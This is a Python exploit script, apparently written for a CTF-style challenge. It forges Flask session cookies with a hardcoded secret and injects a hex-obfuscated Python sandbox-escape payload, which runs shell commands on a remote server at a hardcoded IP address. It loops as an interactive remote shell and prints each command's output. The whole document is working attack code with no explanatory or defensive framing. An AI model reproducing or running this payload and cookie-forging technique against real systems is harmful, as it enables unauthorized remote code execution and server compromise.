import os
from itsdangerous import exc
import requests
import ast

host = "http://138.68.179.179:31076/"


def payload_com(command):
    value = [".", "_", "[","\'","("]
    hex_val = ['\\\\\\\\x2e', '\\\\\\\\x5f', '\\\\\\\\x5b', '\\\'','\\\\\\\\x28']
    #string = 'exec\'i=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == \\"catch_warnings\\"][0]()._module.__builtins__[\\"__import__\\"];i(\\"os\\").system(\\"{}\\")\'#'.format(command)
    string = 'exec\'i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__[\\"__import__\\"];i(\\"flask\\").session[\\"x\\"]=i(\\"os\\").popen(\\"'+command+'\\").read()\'#'
    for i in range(len(value)):
        string = string.replace(value[i], hex_val[i])
    return string

while True:
    com = input(">>>")

    payload = payload_com(com)
    session_token_generation_command = "flask-unsign --sign --cookie \"{'ingredient': b'"+payload+"', 'measurements': b'1+1'}\" --secret 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw'"
    session_token = os.popen(session_token_generation_command).read().strip()
    try:
        result_request = requests.get(host, cookies={'session':session_token})
        new_cookie = result_request.headers["Set-Cookie"].split("=")[1].split(";")[0]

        ses_tok_dec_command = "flask-unsign --decode --cookie {}".format(new_cookie)
        decoded = os.popen(ses_tok_dec_command).read().strip()
        a = ast.literal_eval(decoded)
        print(a["x"].decode("ascii"))
    except: 
        print("error: To big of a command. Cookie not found")
